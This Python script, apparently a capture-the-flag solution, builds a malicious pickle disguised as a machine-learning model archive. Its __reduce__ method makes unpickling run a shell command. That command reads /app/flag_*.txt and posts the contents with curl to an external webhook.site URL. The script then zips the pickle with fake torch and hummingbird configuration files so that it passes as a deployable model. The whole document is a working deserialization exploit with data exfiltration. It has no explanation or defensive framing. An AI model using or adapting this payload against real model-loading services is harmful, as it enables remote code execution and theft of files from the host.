#!/usr/bin/env python3
from os import system
from os.path import join as path_join
from shutil import make_archive
from pickle import dumps as pickle_dumps
from tempfile import mkdtemp


class PickleRCEExploit(object):
    def __reduce__(self):
        return system, ('curl "https://webhook.site/0bb1dfff-5d2b-4968-9a83-a6a8ef6a4c28" -d "flag=$(cat /app/flag_*.txt)"',)


if __name__ == "__main__":
    temp_dir = mkdtemp()

    with open(path_join(temp_dir, "deploy_model.zip"), "wb") as pickle_file:
        pickle_file.write(
            pickle_dumps(PickleRCEExploit())
        )

    with open(path_join(temp_dir, "model_configuration.txt"), "w") as config_file:
        config_file.write("hummingbird=0.4.10\ntorch=2.3.0.dev20240124+cpu")

    with open(path_join(temp_dir, "model_type.txt"), "w") as type_file:
        type_file.write("torch")

    make_archive("malicious_model", 'zip', temp_dir)
